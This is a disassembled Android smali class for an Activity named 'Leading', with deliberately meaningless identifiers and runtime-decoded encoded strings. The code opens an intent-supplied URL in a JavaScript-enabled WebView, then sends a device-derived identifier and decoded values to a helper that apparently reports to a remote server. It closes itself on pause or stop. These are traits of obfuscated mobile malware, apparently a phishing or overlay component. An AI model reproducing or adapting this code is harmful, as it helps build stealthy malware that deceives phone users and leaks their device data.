.class public Lcompse/refact/st/upsssss/Leading;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

.field private zxcvxvsdvsvsvs:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Leading;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Leading;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7

    const/4 v6, 0x0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Leading;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "\u0003}\u001a"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/webkit/WebView;

    invoke-direct {v1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcompse/refact/st/upsssss/Leading;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    iget-object v1, p0, Lcompse/refact/st/upsssss/Leading;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Leading;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    new-instance v2, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;

    invoke-direct {v2, p0, p0}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;-><init>(Lcompse/refact/st/upsssss/Leading;Landroid/app/Activity;)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Leading;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v0}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ":B\u0017C\u001fI\u0011\u0008:B\u0017C\u001fI\u0011\t\u0006O\u0006"

    invoke-static {v3}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Leading;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {p0, v1}, Lcompse/refact/st/upsssss/Leading;->setContentView(Landroid/view/View;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Leading;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v0}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ":@1\u0001&G&"

    invoke-static {v2}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "WK"

    invoke-static {v3}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v6, v3}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcompse/refact/st/upsssss/Leading;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lcompse/refact/st/upsssss/Leading;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v5, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v6, v5}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "S\u0005[7]\"\u000f\u001aJ7K?A1\u000e*"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Leading;->finish()V

    return-void
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Leading;->finish()V

    return-void
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Leading;->finish()V

    return-void
.end method
